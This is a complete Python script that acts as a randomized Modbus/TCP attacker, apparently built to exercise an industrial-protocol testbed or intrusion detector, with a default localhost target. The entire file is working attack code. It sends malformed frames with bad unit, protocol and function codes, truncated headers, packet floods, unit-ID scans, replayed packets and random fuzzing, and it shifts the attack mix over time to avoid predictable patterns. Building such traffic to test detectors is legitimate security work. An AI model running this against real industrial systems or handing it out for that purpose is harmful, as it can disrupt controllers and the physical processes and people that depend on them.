#!/usr/bin/env python3
"""
modbus_attacker_auto_v2.py

Randomized Modbus/TCP attacker v2
- Evolves selection probabilities over time (so attack types become less predictable)
- Sends a mixture of valid and malicious frames
- CLI options to control duration, jitter, flood intensity, seed, repeat
- Default target: 127.0.0.1:5020
"""

import socket, struct, time, random, argparse
from collections import deque

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 5020

def build_mbap(trans_id:int, proto_id:int, unit_id:int, func_code:int, data:bytes=b"") -> bytes:
    pdu = bytes([func_code]) + data
    length = 1 + len(pdu)   # unit_id + pdu
    header = struct.pack(">HHHB", trans_id & 0xFFFF, proto_id & 0xFFFF, length & 0xFFFF, unit_id & 0xFF)
    return header + pdu

def send_packet(sock, pkt):
    try:
        sock.sendall(pkt)
    except Exception as e:
        print("send error:", e)
        return False
    return True

def evolving_weights(weights, factor=0.95):
    """Multiply weights by factor and renormalize — simple evolution so probabilities drift."""
    w = [max(0.01, x*factor) for x in weights]  # avoid zero
    s = sum(w)
    return [x/s for x in w]

def run_attacker(args):
    random.seed(args.seed)
    trans = 1
    recent = deque(maxlen=200)
    modes = args.modes.copy()
    weights = args.weights.copy()

    end_time = time.time() + args.duration if args.duration > 0 else None
    last_evolve = time.time()

    with socket.create_connection((args.host, args.port), timeout=3) as s:
        print(f"Connected to {args.host}:{args.port}. Running attacker for {args.duration or '∞'} seconds.")
        while True:
            if end_time and time.time() >= end_time:
                print("Duration reached. Exiting attacker.")
                break

            # occasionally evolve the weights to make behavior drift
            if time.time() - last_evolve > args.evolve_interval:
                weights = evolving_weights(weights, factor=args.evolve_factor)
                last_evolve = time.time()

            mode = random.choices(modes, weights=weights, k=1)[0]

            if mode == "good":
                pkt = build_mbap(trans, 0, 1, 3, data=struct.pack(">HH", 0, 5))
                send_packet(s, pkt); recent.append(pkt); trans += 1
                if args.verbose: print("GOOD")
                time.sleep(0.4 + random.random()*0.2)

            elif mode == "bad_unit":
                uid = random.choice([255, 254, 300, 512])
                pkt = build_mbap(trans, 0, uid & 0xFF, 3, data=struct.pack(">HH", 0, 3))
                send_packet(s, pkt); recent.append(pkt); trans += 1
                if args.verbose: print("BAD_UNIT", uid)
                time.sleep(0.3)

            elif mode == "bad_proto":
                proto = random.choice([1, 99, 0xFFFF])
                pkt = build_mbap(trans, proto, 1, 3, data=struct.pack(">HH", 0, 2))
                send_packet(s, pkt); recent.append(pkt); trans += 1
                if args.verbose: print("BAD_PROTO", proto)
                time.sleep(0.4)

            elif mode == "bad_func":
                fc = random.choice([128, 200, 250])
                pkt = build_mbap(trans, 0, 1, fc, data=b"")
                send_packet(s, pkt); recent.append(pkt); trans += 1
                if args.verbose: print("BAD_FUNC", fc)
                time.sleep(0.35)

            elif mode == "truncated":
                header = struct.pack(">HHHB", trans & 0xFFFF, 0, 50, 1)
                payload = bytes([3, 0x00])  # short payload despite claimed length
                pkt = header + payload
                send_packet(s, pkt); recent.append(pkt); trans += 1
                if args.verbose: print("TRUNCATED")
                time.sleep(0.5)

            elif mode == "flood":
                n = args.flood_count
                if args.verbose: print("FLOOD start", n, "pkts")
                for i in range(n):
                    pkt = build_mbap(trans, 0, 1, 3, data=struct.pack(">HH", 0, 1))
                    send_packet(s, pkt); recent.append(pkt); trans += 1
                    # very short spacing for flood
                    if i % 10 == 0:
                        time.sleep(0.001)
                if args.verbose: print("FLOOD done")
                time.sleep(0.05)

            elif mode == "scan":
                if args.verbose: print("SCAN", end=" ")
                for uid in range(1, min(1+args.scan_max, 255)):
                    pkt = build_mbap(trans, 0, uid, 3, data=struct.pack(">HH", 0,1))
                    send_packet(s, pkt); recent.append(pkt); trans += 1
                if args.verbose: print("done")
                time.sleep(0.2)

            elif mode == "replay":
                if recent:
                    pkt = random.choice(list(recent))
                    send_packet(s, pkt)
                    if args.verbose: print("REPLAY")
                time.sleep(0.3)

            elif mode == "random_fuzz":
                # random bytes appended to PDU
                size = random.randint(0, 20)
                data = bytes(random.getrandbits(8) for _ in range(size))
                fc = random.randint(0,255)
                uid = random.randint(0, 300) & 0xFF
                pkt = build_mbap(trans, random.choice([0,0,0,99]), uid, fc, data=data)
                send_packet(s, pkt); recent.append(pkt); trans += 1
                if args.verbose: print("RANDOM_FUZZ")
                time.sleep(0.25)

            else:
                time.sleep(0.2)

            # small random jitter always
            time.sleep(random.uniform(0, args.jitter))

def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument("--host", default=DEFAULT_HOST)
    p.add_argument("--port", default=DEFAULT_PORT, type=int)
    p.add_argument("--duration", type=float, default=60.0, help="seconds (0 for infinite)")
    p.add_argument("--seed", type=int, default=42)
    p.add_argument("--jitter", type=float, default=0.02)
    p.add_argument("--verbose", action="store_true")
    p.add_argument("--flood_count", type=int, default=120)
    p.add_argument("--scan_max", type=int, default=16)
    p.add_argument("--evolve-interval", dest="evolve_interval", type=float, default=15.0)
    p.add_argument("--evolve-factor", dest="evolve_factor", type=float, default=0.92)
    p.add_argument("--modes", nargs="+", default=["good","bad_unit","bad_proto","bad_func","truncated","flood","scan","replay","random_fuzz"])
    p.add_argument("--weights", nargs="+", type=float, default=None)
    args = p.parse_args()

    # sensible default weights if none provided
    if args.weights is None:
        args.weights = [0.35,0.06,0.06,0.04,0.04,0.12,0.06,0.08,0.19]
    # normalize
    s = sum(args.weights)
    args.weights = [w/s for w in args.weights]
    return args

if __name__ == "__main__":
    args = parse_args()
    # map the CLI names to the internal params
    # tiny compatibility: map dashes
    # run!
    try:
        run_attacker(args)
    except KeyboardInterrupt:
        print("Attacker stopped by user.")
